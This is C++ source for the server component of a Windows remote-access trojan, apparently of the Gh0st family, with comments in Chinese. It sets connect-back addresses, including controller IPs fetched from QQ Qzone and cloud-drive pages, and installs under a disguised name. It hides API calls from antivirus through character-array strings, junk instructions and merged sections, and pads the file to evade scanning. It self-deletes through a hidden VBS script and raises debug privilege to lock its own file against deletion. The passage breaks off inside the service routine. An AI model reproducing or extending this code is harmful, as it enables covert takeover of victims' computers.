// WorkDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <afxwin.h>
#include <tlhelp32.h>
#include <io.h>
#include <Shlobj.h>
#include <shellapi.h>
#include <string.h> 
#include "wininet.h"
#import "msxml2.dll"
//把此CPP写入指定区段
#pragma code_seg("PAGE") 
//自定义对齐方式

#pragma comment(linker, "/FILEALIGN:150")
#pragma comment(linker, "/ALIGN:150")//定义最小节的大小,数值越小程序体积越小 

/*
//延迟加载
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:WININET.dll")
#pragma comment(linker, "/DELAYLOAD:WS2_32.dll")
#pragma comment(linker, "/DELAYLOAD:PSAPI.DLL")
#pragma comment(linker, "/DELAYLOAD:GDI32.dll")
#pragma comment(linker, "/DELAYLOAD:ADVAPI32.dll")
#pragma comment(linker, "/DELAYLOAD:SHELL32.dll")
#pragma comment(linker, "/DELAYLOAD:SHLWAPI.dll")
#pragma comment(linker, "/DELAYLOAD:WINMM.dll")
#pragma comment(linker, "/DELAYLOAD:USER32.dll")
#pragma comment(linker, "/DELAYLOAD:WTSAPI32.dll")
#pragma comment(linker, "/DELAYLOAD:IMM32.dll")
#pragma comment(linker, "/DELAYLOAD:advapi32.dll")
#pragma comment(linker, "/DELAYLOAD:user32.dll")
#pragma comment(linker, "/DELAYLOAD:shell32.dll")
#pragma comment(linker, "/DELAYLOAD:userenv.dll")
#pragma comment(linker, "/DELAYLOAD:AVICAP32.dll")
#pragma comment(linker, "/DELAYLOAD:ole32.dll")
#pragma comment(linker, "/DELAYLOAD:oleaut32.dll")
#pragma comment(linker, "/DELAYLOAD:msvfw32.dll")
#pragma comment(linker, "/DELAYLOAD:msvcp60.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")*/

//定义垃圾指令
#define ZHANG __asm nop;
#define XIAOYUAN Sleep(0);
#define XYMS __asm nop;
#define ZFYZS __asm nop;
#define WSZFY __asm nop;
#define FUFUFU __asm nop;
// 合并区段
#pragma comment(linker, "/MERGE:.rdata=.data")//把rdata区段合并到data区段里
#pragma comment(linker, "/MERGE:.text=.data")//把text区段合并到data区段里
#pragma comment(linker, "/MERGE:.reloc=.data")//把reloc区段合并到data区段里
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "Declare.h"   //动态调用库函数
#include "Myfunction.h"  //自定义函数

Myfunction *Gyfunction;
//=============================================================
struct ONLINEINFO
{
	CHAR DNS1[100];     //上线DNS 1
	CHAR DNS2[100];     //上线DNS 1  QQ上线
	CHAR DNS3[100];     //上线DNS 1  网盘上线
	WORD Port1;         //上线端口 1
	WORD Port2;         //上线端口 2
	WORD Port3;         //上线端口 3
	CHAR szMark[100];  //服务版本
}m_OnlineInfo=
{
	"127.0.0.1",
	"123456789",
	"http://xxxx.ys168.com",
	2085,
	2085,
	2085,
	"V_120305"
};

//============================================================

struct SERVERINFO
{
	CHAR ReleacsName[100];   //安装服务名称
	CHAR ReleasePath[100];   //安装途径
	CHAR ReleaseName[50];    //安装名称
	CHAR szGroup[100];       //上线分组
	CHAR Mexi[100];          //运行互斥
	BOOL Dele_te;            //安装自删除
	BOOL Dele_zc;            //安装运行
	BOOL Dele_zd;            //安装增大
	BOOL Dele_fs;            //占坑防删除安装
	BOOL Dele_Kzj;           //K终结者
}m_ServiceInfo=
{
	"YYYYYYYYYYYY",
	"%ProgramFiles%\\Rumno Qrstuv",
	"SB360.exe",
	"默认分组",
	"Cao360",
	0,    //0为安装不删除    1为安装删除
	0,    //0为不上线复活    1为复活安装
	0,    //0为安装不增大    1为安装增大
	0,    //0为普通安装      1为占坑防删除安装
	0     //0为共同安装      1为K终结者安装
};

CHAR ServiceName[100];   //服务名称
CHAR ServicePlay[128];   //服务显示
CHAR ServiceDesc[256];   //服务描述

//============================================================

enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};
char AZname[MAX_PATH]={NULL};  //安装途径及名称

static BOOL FuckCracker=TRUE;
DWORD	g_dwServiceType;
VOID MyEncryptFunction(LPSTR szData,WORD Size);
void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName);  //修改分组
void RunService(char *m_ServPath,char *m_ServiceName,char *m_DisplayName,char *m_Description);  //写入服务启动函数
void my_stormRands(CHAR Number,CHAR Data[]);  //获取随机名称
int StormRand(int count);


//================================================================================================
VOID Wj_OnButtonAdd(LPSTR Path)  //文件加大函数  Path 文件名
{
	int m_Size=15;  //m_Size=10 就是10M
	DWORD dwSize = m_Size * 1024;
	DWORD iSize; 	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS

	char HvnXs01[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs01);
	HANDLE hFile = pCreateFileA
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	if(hFile==INVALID_HANDLE_VALUE)  //失败
		return;
	char Wffkl05[] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r','\0'};
	SetFilePointerT pSetFilePointer=(SetFilePointerT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl05);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	pSetFilePointer(hFile,0,NULL,FILE_END);

	char Wffkl09[] = {'G','e','t','F','i','l','e','S','i','z','e','\0'};
	GetFileSizeT pGetFileSize=(GetFileSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl09);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    iSize = pGetFileSize(hFile,NULL);        

	char HvnXs02[] = {'W','r','i','t','e','F','i','l','e','\0'};
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs02);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	if((dwSize*1024)>iSize)  //判断文件是否过大 防止服务端程序多次点击运行
	{  
	    DWORD dwBytes=NULL;
		putchar(99);
		CHAR Buffer[1024]={NULL};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
	    for (DWORD n=0;n<dwSize;n++)
		{
		    if(n%1024==0){
			    for (int x=0;x<1024;x++)
				    Buffer[x]=(rand()+x)%255;    //写入随机垃圾数据
			}
		pWriteFile(hFile,Buffer,1024,&dwBytes,NULL);
		}
	}
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

void DeleteMe()   //程序自删除
{
	HANDLE hFile;
	DWORD dwWritten;
putchar(99);
	char Qname[100]={0};
	char cmdline[500]={0};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char szbuf[256]={0};
	char RdNyz00[] = {'d','i','m',' ','w','s','h','\0'};
	char RdNyz01[] = {'O','n',' ','E','r','r','o','r',' ','R','e','s','u','m','e',' ','N','e','x','t','\0'};
	ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char RdNyz02[] = {'s','e','t',' ','w','s','h','=','c','r','e','a','t','e','O','b','j','e','c','t','(','"','W','S','c','r','i','p','t','.','S','h','e','l','l','"',')','\0'};
	char RdNyz03[] = {'S','e','t',' ','o','b','j','F','S','O',' ','=',' ','C','r','e','a','t','e','O','b','j','e','c','t','(','"','S','c','r','i','p','t','i','n','g','.','F','i','l','e','S','y','s','t','e','m','O','b','j','e','c','t','"',')','\0'};
	char RdNyz04[] = {'w','s','c','r','i','p','t','.','s','l','e','e','p',' ','1','0','0','0','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char RdNyz05[] = {'o','b','j','F','S','O','.','D','e','l','e','t','e','F','i','l','e','(','"','\0'};
	char RdNyz06[] = {'"',')',',',' ','T','r','u','e','\0'};
	char RdNyz07[] = {'c','r','e','a','t','e','o','b','j','e','c','t','(','"','s','c','r','i','p','t','i','n','g','.','f','i','l','e','s','y','s','t','e','m','o','b','j','e','c','t','"',')','.','d','e','l','e','t','e','f','i','l','e',' ','w','s','c','r','i','p','t','.','s','c','r','i','p','t','f','u','l','l','n','a','m','e','\0'};

//dim wsh
//On Error Resume Next
//set wsh=createObject("WScript.Shell")
//Set objFSO = CreateObject("Scripting.FileSystemObject")
//wscript.sleep(1000)
//objFSO.DeleteFile("C:\Documents and Settings\Administrator\桌面\SB360.exe"), True
//createobject("scripting.filesystemobject").deletefile wscript.scriptfullname


	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateFileA");
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WriteFile");	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char JtQBs02[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JtQBs02);

	char LCoHX03[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LCoHX03);
	pGetModuleFileNameA(NULL,szbuf,MAX_PATH);   //用于获取程序本身路径

	Gyfunction->my_sprintf(cmdline,"%s\n\r%s\n\r%s\n\r%s\n\r%s\n\r%s%s%s\n\r%s",RdNyz00,RdNyz01,RdNyz02,RdNyz03,RdNyz04,RdNyz05,szbuf,RdNyz06,RdNyz07);
	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	int SzName = StormRand(10000);  //随机数字名称
	szbuf[3]='\0';
	Gyfunction->my_sprintf(Qname,"%s%d.vbs",szbuf,SzName); //
	hFile=pCreateFileA(Qname,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	putchar(99);
	pWriteFile(hFile,(LPCVOID)cmdline,sizeof(cmdline),&dwWritten,NULL);
	pCloseHandle(hFile);

	char DYrEN27[] = {'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    ShellExecuteAT pShellExecuteA=(ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
	pShellExecuteA(NULL,"open",Qname,NULL,NULL,SW_HIDE);
	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"ExitProcess");
	pExitProcess(NULL);

}


char	strKillEvent[50]={NULL};
//================================================================================================

//卸载服务端函数
void DelSelf(BOOL FHshanchu)
{
	// 删除离线记录文件
	char strRecordFile[MAX_PATH];	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Mstvw01);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	pGetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	char keylog[] = {'\\','o','u','r','l','o','g','.','d','a','t','\0'};
	plstrcatA(strRecordFile, keylog);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char QUHZg55[] = {'D','e','l','e','t','e','F','i','l','e','A','\0'};
	DeleteFileAT pDeleteFileA = (DeleteFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),QUHZg55);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	pDeleteFileA(strRecordFile);

	DeleteMe();  //程序自删除
 }

//========================================================================================
void RaiseToDebugP()  //提权函数  
{  
    HANDLE hToken;  
    char Wffkl01[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
    GetCurrentProcessT pGetCurrentProcess=(GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);
	char CtxPW35[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW35);
    HANDLE hProcess = pGetCurrentProcess();  	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    if ( pOpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )  
	{  
        TOKEN_PRIVILEGES tkp;  
        char CtxPW34[] = {'L','o','o','k','u','p','P','r','i','v','i','l','e','g','e','V','a','l','u','e','A','\0'};
        LookupPrivilegeValueAT pLookupPrivilegeValueA=(LookupPrivilegeValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW34);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
        if ( pLookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid) )  
		{  
            tkp.PrivilegeCount = 1;  
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
			ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
            char CtxPW33[] = {'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s','\0'};
       
			ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
AdjustTokenPrivilegesT pAdjustTokenPrivileges=(AdjustTokenPrivilegesT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW33);
            BOOL bREt = pAdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0) ;  
		}  
    char CPolQ19[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
    CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ19);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    pCloseHandle(hToken);  
	}      
}  

BOOL OccupyFile( LPCTSTR lpFileName )  
  {  
      BOOL    bRet;  
      //提升自身权限  
	  RaiseToDebugP();  	ZHANG
		  ZHANG
		  XIAOYUAN
		  XYMS
		  XYMS
		  FUFUFU
		  ZFYZS
		  WSZFY
		  FUFUFU
XYMS
   //打开一个pid为4的进程，只要是存在的进程，都可以 
	char FBwWp14[] = {'O','p','e','n','P','r','o','c','e','s','s','\0'};
	  OpenProcessT pOpenProcess=(OpenProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp14);	ZHANG
		  ZHANG
		  XIAOYUAN
		  XYMS
		  XYMS
		  FUFUFU
		  ZFYZS
		  WSZFY
		  FUFUFU
XYMS
    HANDLE hProcess = pOpenProcess( PROCESS_DUP_HANDLE, FALSE, 4);    // 4为system进程号  
     
      if ( hProcess == NULL )  
      {            
          return FALSE;  
      }  
     
      HANDLE hFile;  
      HANDLE hTargetHandle;  
   //以独占模式打开目标文件  
	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);	ZHANG
		  ZHANG
		  XIAOYUAN
		  XYMS
		  XYMS
		  FUFUFU
		  ZFYZS
		  WSZFY
		  FUFUFU
XYMS
   hFile = pCreateFileA( lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);      

      char CPolQ19[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};	ZHANG
		  ZHANG
		  XIAOYUAN
		  XYMS
		  XYMS
		  FUFUFU
		  ZFYZS
		  WSZFY
		  FUFUFU
XYMS
      CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CPolQ19);
      if ( hFile == INVALID_HANDLE_VALUE )  
      {  	ZHANG
	  ZHANG
	  XIAOYUAN
	  XYMS
	  XYMS
	  FUFUFU
	  ZFYZS
	  WSZFY
	  FUFUFU
XYMS
          pCloseHandle( hProcess );  
          return FALSE;  
      }  
     
   //把文件句柄复制到pid=4的进程中去，这样，只要pid=4的进程不退出，谁也动不了目标文件  
	  DuplicateHandleT pDuplicateHandle=(DuplicateHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DuplicateHandle");
	  ZHANG
		  ZHANG
		  XIAOYUAN
		  XYMS
		  XYMS
		  FUFUFU
		  ZFYZS
		  WSZFY
		  FUFUFU
XYMS
    char Wffkl01[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
	  GetCurrentProcessT pGetCurrentProcess=(GetCurrentProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl01);	ZHANG
		  ZHANG
		  XIAOYUAN
		  XYMS
		  XYMS
		  FUFUFU
		  ZFYZS
		  WSZFY
		  FUFUFU
XYMS
    bRet = pDuplicateHandle( pGetCurrentProcess(), hFile, hProcess, &hTargetHandle,   
          0, FALSE, DUPLICATE_SAME_ACCESS|DUPLICATE_CLOSE_SOURCE);  
     
      pCloseHandle( hProcess );  
     
      return bRet;  
  }  

//==============================================================================
VOID MyCreatDirector(LPSTR Path)   //创建文件夹
{
	
	CHAR Dir[MAX_PATH]={NULL};
	int i;
	CreateDirectoryAT pCreateDirectoryA=(CreateDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateDirectoryA");
	for (i=0;(size_t)i<strlen(Path);i++)
	{
		if(Path[i]=='\\')
		{
			Gyfunction->my_strncpy(Dir,Path,i);
			if(_access(Dir,NULL)==-1)
				pCreateDirectoryA(Dir,NULL);
		}
	}

}

//=============================================================================
void MarkTime(LPCTSTR lpServiceName)  //写入服务安装时间信息
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(strSubKey,JYvni08,lpServiceName);

 	SYSTEMTIME st;
	char FBwWp11[] = {'G','e','t','L','o','c','a','l','T','i','m','e','\0'};
	GetLocalTimeT pGetLocalTime=(GetLocalTimeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp11);
 	pGetLocalTime(&st);
	char sDate[MAX_PATH]={NULL};
	char JYvni06[] = {'%','4','d','-','%','.','2','d','-','%','.','2','d',' ','%','.','2','d',':','%','.','2','d','\0'};
	
	pwsprintfA(sDate, JYvni06, st.wYear,st.wMonth,st.wDay, st.wHour,st.wMinute);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, JYvni04, REG_SZ, (char *)sDate, plstrlenA(sDate), 0);
}

/////////////////////////////////////////////////////////////////////////////////////

char   *substr(char   *str,int   istar,int   iend) 
{  
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 

    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 	ZHANG
	ZHANG
	XIAOYUAN
	XYMS
	XYMS
	FUFUFU
	ZFYZS
	WSZFY
	FUFUFU
XYMS
        //p1+=iend; 
		Gyfunction->my_memcpy(p1,p,iend); 
    }
	strcpy(str,p1);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    return   str; 
	
} 

int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	FindPos =(char *)Gyfunction->my_strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		Gyfunction->my_strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)Gyfunction->my_strstr(sSrc, sMatchStr);
	}
	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	free(FindPos);
	return 0;
}

char	*lpszQQ = NULL;
BOOL qqonline(LPCTSTR str)    //QQ	上线
{
	///////////////////////////////上线ip的获取//////////////////////////////////////

		using namespace MSXML2;//使用msxml2命名空间
		CoInitialize(NULL);//初始化com组建
		ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		try
		{
			IXMLHTTPRequestPtr xmlrequest;// 创建一个IXMLHTTPRequestPtr智能指针
			xmlrequest.CreateInstance("Msxml2.XMLHTTP");//冲组建中得到所需的借口,组建也就相当与一个工厂,里面提供了很多个借口,我们只要输入需要的接口名就能获得哪个对象
			_variant_t varp(false);	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			char abc[50]="http://user.qzone.qq.com/";
			strcat(abc,str);
			xmlrequest->open(_bstr_t("GET"),_bstr_t(abc),varp);// 初始化即将发送的头部信息
			xmlrequest->send(); // 发送到服务器
			BSTR bstrbody;
			xmlrequest->get_responseText(&bstrbody);// 获得服务器的反馈信息
			_bstr_t bstrtbody(bstrbody);// 把bstrbody强制转换成_bstr_t类型的数据
			ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			char	chBuff1[300*1024];    //获取到的内容  
			strcpy(chBuff1,(LPCTSTR)bstrtbody);
			
			DWORD SizePoint;
			SizePoint = memfind(chBuff1,"<title>",sizeof(chBuff1),0);
			ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			substr(chBuff1,SizePoint+8,15);
			
			ReplaceStr(chBuff1," ","");	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			ReplaceStr(chBuff1,"[","");
			ReplaceStr(chBuff1,"h","");	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			ReplaceStr(chBuff1,"t","");
			ReplaceStr(chBuff1,"p","");
			
			lpszQQ=chBuff1;
		}
		catch(...)
		{
			
		}
		CoUninitialize();//反初始化com组建库
		
		return true;
}

char	*lpszWP = NULL;

/////////////////////////////////////////////////////////

BOOL wangpang(LPCTSTR str)   //网盘上线
{
	///////////////////////////////上线ip的获取//////////////////////////////////////
	
		//	 char	lpurl[256]="http://fuck360safe.ys168.com";
		char lpurl[256];
		strcpy(lpurl,str);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		//	 CString strURL;
		// CString strID,strPwd,strPath;
		char	chBuff[300*1024];    //获取到的内容  
		
		char DYrEN04[] = {'I','n','t','e','r','n','e','t','O','p','e','n','A','\0'};
	    InternetOpenAT pInternetOpenA=(InternetOpenAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN04);
		DWORD	dwBytesRead=5000;
		HINTERNET	hNet;
		HINTERNET	hFile;
		hNet = pInternetOpenA("Internet Explorer 7.0", 
			
			PRE_CONFIG_INTERNET_ACCESS, NULL, INTERNET_INVALID_PORT_NUMBER, 0);  //获取当前网络连接句柄
		if (hNet == NULL)   //初始化失败
		{
			return 0;
		}

	    char DYrEN03[] = {'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A','\0'};
	    InternetOpenUrlAT pInternetOpenUrlA=(InternetOpenUrlAT)GetProcAddress(LoadLibrary("WININET.dll"),DYrEN03);
		hFile = pInternetOpenUrlA(hNet, 
			lpurl, 
			NULL, 0, 
			INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 
			0);  //获取URL句柄
		if (hFile == NULL)  //没获取到URL句柄
		{
			return 0;
		}
		memset(chBuff, 0, sizeof(chBuff));	//memset内存初始化

		char HrFvD18[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		InternetReadFileT pInternetReadFile=(InternetReadFileT)GetProcAddress(LoadLibrary("WININET.dll"),HrFvD18);
		pInternetReadFile(hFile, chBuff, sizeof(chBuff), &dwBytesRead);
		DWORD SizePoint;
		SizePoint = memfind(chBuff,"<title>",sizeof(chBuff),0);
		ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		substr(chBuff,SizePoint+8,15);

		ReplaceStr(chBuff,"<","");	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		ReplaceStr(chBuff,"/","");
		ReplaceStr(chBuff,"t","");
		ReplaceStr(chBuff,"i","");	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		ReplaceStr(chBuff,"l","");

		lpszWP=chBuff;
		return true;
}

//================================================================================================
void my_ServiceMain()
{
	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
    char FBwWp25[] = {'S','l','e','e','p','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp25);

	////////////////////////////////////////////////////////////////////////////////////////////////
    //互斥  用于重复运行
	char BrmAP29[] = {'C','r','e','a','t','e','E','v','e','n','t','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP29);
	pCreateEventA(NULL, FALSE, FALSE,m_ServiceInfo.Mexi);  //运行互斥

